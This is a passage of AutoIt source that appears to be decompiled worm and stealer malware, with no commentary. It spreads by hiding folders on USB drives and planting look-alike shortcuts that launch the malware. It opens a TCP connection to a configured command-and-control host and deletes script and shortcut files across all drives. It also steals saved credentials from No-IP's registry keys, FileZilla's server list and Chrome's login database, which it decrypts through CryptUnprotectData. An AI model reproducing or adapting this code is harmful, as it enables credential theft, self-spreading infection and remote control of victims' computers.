						FileSetAttrib ( $D [ $DD ] & "\" & $F [ $U ] , "+H" )
						FileCreateShortcut ( "cmd.exe" , $D [ $DD ] & "\" & $F [ $U ] , "" , "/c start " & StringReplace ( $EXE , " " , ChrW ( 34 ) & " " & ChrW ( 34 ) ) & "&explorer /root,""%CD%" & StringReplace ( $F [ $U ] , " " , ChrW ( 34 ) & " " & ChrW ( 34 ) ) & """ & exit" , "" , "%windir%\system32\SHELL32.dll" , "" , 3 , @SW_SHOWMINNOACTIVE )
					Next
				EndIf
				_ARRAYDELETE ( $F , 0 )
			EndIf
		EndIf
	Next
EndFunc
Func USBX ( )
	$D = DriveGetDrive ( "REMOVABLE" )
	For $DD = 1 To UBound ( $D ) - 1
		If DriveStatus ( $D [ $DD ] ) = "READY" Then
			If DriveSpaceFree ( $D [ $DD ] ) > 1024 Then
				$F = _FILELISTTOARRAY ( $D [ $DD ] , "*.*" , 2 )
				If FileExists ( $D [ $DD ] & "\" & $EXE ) Then
					FileSetAttrib ( $D [ $DD ] & "\" & $EXE , "-H+N" )
					FileDelete ( $D [ $DD ] & "\" & $EXE )
				EndIf
				For $U = 1 To UBound ( $F ) - 1
					FileSetAttrib ( $D [ $DD ] & "\" & $F [ $U ] , "-H" )
					FileSetAttrib ( $D [ $DD ] & "\" & $F [ $U ] , "+N" )
					FileDelete ( $D [ $DD ] & "\" & $F [ $U ] & ".lnk" )
				Next
				_ARRAYDELETE ( $F , 0 )
			EndIf
		EndIf
	Next
EndFunc
Func RC ( )
	If @error Then
		Return - 1
	EndIf
	If $SOCK < 1 Then
		Return - 1
	EndIf
	$DATA = TCPRecv ( $SOCK , 1024 , 0 )
	If @error Then
		Return - 1
	EndIf
	$MEM &= $DATA
	If StringInStr ( $MEM , @CRLF ) Then
		$DA = StringSplit ( $MEM , @CRLF )
		$DATA = $DA [ 1 ]
		$IDX = StringInStr ( $MEM , @CRLF )
		$IDX += StringLen ( String ( @CRLF ) )
		$LN = StringLen ( $MEM )
		$MEM = StringMid ( $MEM , $IDX , $LN - $IDX )
		Return $DATA
	EndIf
	Return ""
EndFunc
Func SD ( $DA )
	If @error Then
	EndIf
	TCPSend ( $SOCK , $DA & @CRLF )
	If @error Then
		Return 0
	Else
		Return 1
	EndIf
EndFunc
Func CN ( )
	TCPCloseSocket ( $SOCK )
	If @error Then
	EndIf
	TCPShutdown ( )
	If @error Then
	EndIf
	TCPStartup ( )
	If @error Then
	EndIf
	$SOCK = - 1
	$SOCK = TCPConnect ( TCPNameToIP ( $HOST ) , $PORT )
	If @error Then
	EndIf
EndFunc
Func K ( )
	$B = DllStructCreate ( "char[3]" )
	DllCall ( "kernel32.dll" , "long" , "GetLocaleInfo" , "long" , 1024 , "long" , 7 , "ptr" , DllStructGetPtr ( $B ) , "long" , 3 )
	Return DllStructGetData ( $B , 1 )
EndFunc
Func BK ( )
	$ST = StringSplit ( "a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z" , "," )
	For $H = 1 To $ST [ 0 ]
		If DriveStatus ( $ST [ $H ] & ":\" ) = "READY" Then
			FileSetAttrib ( $ST [ $H ] & ":\*.*" , "-H" )
			FileDelete ( $ST [ $H ] & ":\*.vbs" )
			FileDelete ( $ST [ $H ] & ":\*.scr" )
			FileDelete ( $ST [ $H ] & ":\*.lnk" )
		EndIf
	Next
EndFunc
Func CUSB ( )
	$USB = IniRead ( $DIR & $EXE & ".ini" , "" , "usb" , "!" )
	If $USB = "!" Then
		$SP = StringSplit ( @AutoItExe , "\" )
		If $SP [ 0 ] = 2 And StringLen ( $SP [ 1 ] ) = 2 And StringLower ( $SP [ 2 ] ) = StringLower ( $EXE ) Then
			IniWrite ( $DIR & $EXE & ".ini" , "" , "usb" , "Y" )
		Else
			IniWrite ( $DIR & $EXE & ".ini" , "" , "usb" , "N" )
		EndIf
	EndIf
	$USB = IniRead ( $DIR & $EXE & ".ini" , "" , "usb" , "!" )
EndFunc
Func NOIP ( )
	$PUSR = RegRead ( "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC" , "Username" )
	If $PUSR = "" Then Return ""
	$PPWD = RegRead ( "HKEY_LOCAL_MACHINE\SOFTWARE\Vitalwerks\DUC" , "Password" )
	Return "URL: http://no-ip.com/" & $Y & "USR: " & $PUSR & $Y & "PWD: /base64" & $PPWD & $Y
EndFunc
Func FILEZILLA ( )
	Local $PWDS = "" , $H , $PFN = EnvGet ( "appdata" ) & "\FileZilla\recentservers.xml"
	If FileExists ( $PFN ) = False Then Return ""
	$H = FileOpen ( $PFN , 0 )
	If $H = - 1 Then Return ""
	$PHOST = ""
	$PPORT = 21
	$PUSR = ""
	$PPASS = ""
	While True
		$LINE = FileReadLine ( $H )
		If @error = - 1 Then ExitLoop
		If StringInStr ( $LINE , "<Host>" ) Then
			$PUSR = ""
			$PPASS = ""
			$PPORT = 21
			$PHOST = StringMid ( $LINE , 1 , StringInStr ( $LINE , "</" ) - 1 )
			$PHOST = StringMid ( $PHOST , StringInStr ( $PHOST , ">" ) + 1 )
		EndIf
		If StringInStr ( $LINE , "<Port>" ) Then
			$PPORT = StringMid ( $LINE , 1 , StringInStr ( $LINE , "</" ) - 1 )
			$PPORT = StringMid ( $PPORT , StringInStr ( $PPORT , ">" ) + 1 )
		EndIf
		If StringInStr ( $LINE , "<User>" ) Then
			$PUSR = StringMid ( $LINE , 1 , StringInStr ( $LINE , "</" ) - 1 )
			$PUSR = StringMid ( $PUSR , StringInStr ( $PUSR , ">" ) + 1 )
		EndIf
		If StringInStr ( $LINE , "<Pass>" ) Then
			$PPASS = StringMid ( $LINE , 1 , StringInStr ( $LINE , "</" ) - 1 )
			$PPASS = StringMid ( $PPASS , StringInStr ( $PPASS , ">" ) + 1 )
		EndIf
		If StringInStr ( $LINE , "</Server>" ) Then
			$PWDS = $PWDS & "URL: ftp://" & $PHOST & ":" & $PPORT & $Y & "USR: " & $PUSR & $Y & "PWD: " & $PPASS & $Y
		EndIf
	WEnd
	Return $PWDS
EndFunc
Func CHROME ( )
	Local $Q , $R , $PWDS = "" , $PFN = RegRead ( "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" , "Local AppData" ) & "\Google\Chrome\User Data\Default\Login Data"
	If FileExists ( $PFN ) = False Then Return ""
	_SQLITE_STARTUP ( )
	_SQLITE_OPEN ( $PFN )
	_SQLITE_QUERY ( - 1 , "SELECT * FROM logins;" , $Q )
	While _SQLITE_FETCHDATA ( $Q , $R ) = 0
		$PWDS = $PWDS & "URL: " & $R [ 0 ] & $Y & "USR: " & $R [ 3 ] & $Y & "PWD: " & UNCRYPTRDPPASSWORD ( $R [ 5 ] ) & $Y
	WEnd
	_SQLITE_CLOSE ( )
	_SQLITE_SHUTDOWN ( )
	Return $PWDS
EndFunc
Func UNCRYPTRDPPASSWORD ( $BIN )
	Local Const $CRYPTPROTECT_UI_FORBIDDEN = 1
	Local Const $DATA_BLOB = "int;ptr"
	Local $PASSSTR = DllStructCreate ( "byte[1024]" )
	Local $DATAIN = DllStructCreate ( $DATA_BLOB )
	Local $DATAOUT = DllStructCreate ( $DATA_BLOB )
	$PWDESCRIPTION = "psw"
	$PWDHASH = ""
	DllStructSetData ( $DATAOUT , 1 , 0 )
	DllStructSetData ( $DATAOUT , 2 , 0 )
	DllStructSetData ( $PASSSTR , 1 , $BIN )
	DllStructSetData ( $DATAIN , 2 , DllStructGetPtr ( $PASSSTR , 1 ) )
	DllStructSetData ( $DATAIN , 1 , BinaryLen ( $BIN ) )
	$RETURN = DllCall ( "crypt32.dll" , "int" , "CryptUnprotectData" , "ptr" , DllStructGetPtr ( $DATAIN ) , "ptr" , 0 , "ptr" , 0 , "ptr" , 0 , "ptr" , 0 , "dword" , $CRYPTPROTECT_UI_FORBIDDEN , "ptr" , DllStructGetPtr ( $DATAOUT ) )
	If @error Then Return ""
	$LEN = DllStructGetData ( $DATAOUT , 1 )
	$PWDHASH = Ptr ( DllStructGetData ( $DATAOUT , 2 ) )
	$PWDHASH = DllStructCreate ( "byte[" & $LEN & "]" , $PWDHASH )
	Return BinaryToString ( DllStructGetData ( $PWDHASH , 1 ) , 4 )
EndFunc
